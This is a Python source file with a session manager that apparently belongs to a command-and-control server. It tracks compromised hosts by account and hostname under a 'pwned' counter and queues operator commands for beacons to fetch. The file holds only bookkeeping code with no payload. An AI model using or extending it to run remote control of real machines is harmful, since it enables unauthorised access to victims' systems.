import threading
from datetime import datetime, timezone


class SessionManager:
    def __init__(self, activity_log=None):
        self.active_session_id = 1
        self.sessions = {}
        self.pwned_id = 0
        self.active_cwd = "~"
        self.client_account = ""
        self.client_hostname = ""
        self.lock = threading.Lock()
        self.activity_log = activity_log
        # Command queue: session_id -> command string (set by operator, consumed by beacon handler)
        self.pending_commands = {}

    def register_client(self, client_str: str) -> int:
        with self.lock:
            if client_str in self.sessions.values():
                return list(self.sessions.keys())[list(self.sessions.values()).index(client_str)]
            self.pwned_id += 1
            self.sessions[self.pwned_id] = client_str
            parts = client_str.split("@")
            account = parts[0] if len(parts) > 0 else ""
            hostname = parts[1] if len(parts) > 1 else ""
            if self.activity_log:
                self.activity_log.log_session(self.pwned_id, client_str, hostname=hostname, account=account)
            return self.pwned_id

    def get_client_parts(self, session_id: int = None) -> tuple[str, str]:
        sid = session_id or self.active_session_id
        client = self.sessions.get(sid, "")
        parts = client.split("@")
        account = parts[0] if len(parts) > 0 else ""
        hostname = parts[1] if len(parts) > 1 else ""
        return account, hostname

    def queue_command(self, command: str, session_id: int = None):
        sid = session_id or self.active_session_id
        self.pending_commands[sid] = command

    def dequeue_command(self, session_id: int = None) -> str | None:
        sid = session_id or self.active_session_id
        return self.pending_commands.pop(sid, None)

    def has_pending(self, session_id: int = None) -> bool:
        sid = session_id or self.active_session_id
        return sid in self.pending_commands
